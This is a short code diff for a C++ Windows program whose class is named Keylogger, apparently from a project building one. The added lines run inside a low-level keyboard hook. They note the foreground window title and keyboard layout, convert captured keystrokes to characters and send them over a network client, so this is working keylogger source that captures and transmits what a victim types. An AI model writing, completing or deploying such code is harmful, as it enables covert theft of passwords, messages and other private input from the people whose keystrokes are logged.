@@ -62,6 +62,54 @@ LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPAR
 		if (key->vkCode == VK_CAPITAL)
 			keyState[VK_CAPITAL] ^= 0xff;
 
+		
+		int keyGroup;
+		int keyPos;
+		bool isTracedKey = false;
+		for(int i = 0; i < keySets.size(); i++)
+			for (int j = 0; j < keySets[i].size(); j++)
+			{
+				if (keySets[i][j] == key->vkCode)
+				{
+					keyGroup = i;
+					keyPos = j;
+					isTracedKey = true;
+					break;
+				}
+			}
+
+		if (isTracedKey)
+		{
+			HWND hWindow = GetForegroundWindow();
+			HKL hLang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));
+
+			wchar_t titleBuff[256];
+			GetWindowTextW(hWindow, titleBuff, 256);
+			std::wstring title(titleBuff);
+			bool isWorthy = false;
+
+			if (previousWindowTitle != title)
+			{
+
+
+			}
+			else if (title != L"")
+				isWorthy = true;
+
+			if(isWorthy)
+				switch (keyGroup)
+				{
+				case 0:
+					client->SendBuff(specialKeyNames[keyPos]);
+					break;
+
+				case 1:
+					wchar_t wcharBuff[2];
+					ToUnicodeEx(key->vkCode, 0, keyState, wcharBuff, 2, 0, hLang);
+					client->SendBuff(wcharBuff[0]);
+					break;
+				}
+		}
 
 	}
 
